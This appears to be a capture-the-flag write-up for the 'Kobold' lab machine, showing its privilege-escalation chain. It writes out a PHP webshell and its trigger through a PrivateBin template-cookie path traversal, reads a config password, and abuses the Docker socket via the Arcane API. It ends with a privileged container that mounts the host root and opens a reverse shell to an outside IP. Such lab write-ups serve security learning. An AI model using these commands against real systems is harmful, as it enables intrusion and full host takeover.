## Summary

Kobold is a Linux machine featuring a multi-service web application. The attack chain involves exploiting an unauthenticated RCE in MCPJam Inspector to get initial foothold as `ben`, abusing a PrivateBin LFI vulnerability to obtain Arcane credentials, and finally escaping to root via Docker socket abuse inside a privileged container.

**Vulnerabilities exploited:**
- MCPJam Inspector — Unauthenticated command injection via `/api/mcp/connect`
- GHSA-g2j9-g8r5-rg82 — PrivateBin path traversal via template cookie
- Docker socket escape — Privileged container with host filesystem mount

## Privilege Escalation

### Step 1 — PrivateBin LFI (GHSA-g2j9-g8r5-rg82)

`ben` belongs to group `operator` which has write access to `/privatebin-data/data/` — the data directory of the PrivateBin Docker container.

PrivateBin < 1.7.2 is vulnerable to path traversal via the `template` cookie, allowing inclusion of arbitrary PHP files.

**Write webshell:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
```

![Writing the webshell](/assets/img/posts/kobold/write_webshell.png)

**Trigger RCE via cookie:**

```bash
curl -k "https://bin.kobold.htb/?cmd=id" \
  -H "Cookie: template=../data/shell"
```

![Triggering the RCE via template cookie](/assets/img/posts/kobold/triggerrce.png)

![RCE as nobody inside PrivateBin container confirmed](/assets/img/posts/kobold/vulnerabilty-confirmed.png)

**Read PrivateBin configuration:**

```bash
curl -k "https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php" \
  -H "Cookie: template=../data/shell"
```

![conf.php content](/assets/img/posts/kobold/confPHP.png)

![Password in conf.php](/assets/img/posts/kobold/passconfphp.png)

### Step 3 — Docker Socket Escape

Using the Arcane API, create a project that mounts the Docker socket:

```bash
TOKEN="<JWT_TOKEN>"

curl -s -X POST http://10.129.245.50:3552/api/environments/0/projects \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
  "composeContent": "services:\n  evil:\n    image: mysql:latest\n    environment:\n      MYSQL_ROOT_PASSWORD: toor\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock",
  "envContent": "",
  "name": "pwn2"
}'

curl -s -X POST http://10.129.245.50:3552/api/environments/0/projects/<PROJECT_ID>/up \
  -H "Authorization: Bearer $TOKEN"
```

Access shell inside the mysql container via Arcane UI. From inside the container, abuse the Docker socket to create a privileged container with the host filesystem mounted:

```bash
# Create privileged container
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "mysql:latest",
    "Cmd": ["bash", "-c", "bash -i >& /dev/tcp/10.10.17.60/6666 0>&1"],
    "HostConfig": {
      "Binds": ["/:/mnt/host"],
      "Privileged": true
    }
  }'

# Start it
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/<CONTAINER_ID>/start
```

## Lessons Learned
- MCP/AI tooling can expose dangerous unauthenticated command execution
- Group memberships (`operator`) can expose sensitive service data
- LFI via HTTP cookies is a commonly overlooked attack vector
- Docker socket inside containers = full host compromise
- Password reuse across services is always worth testing
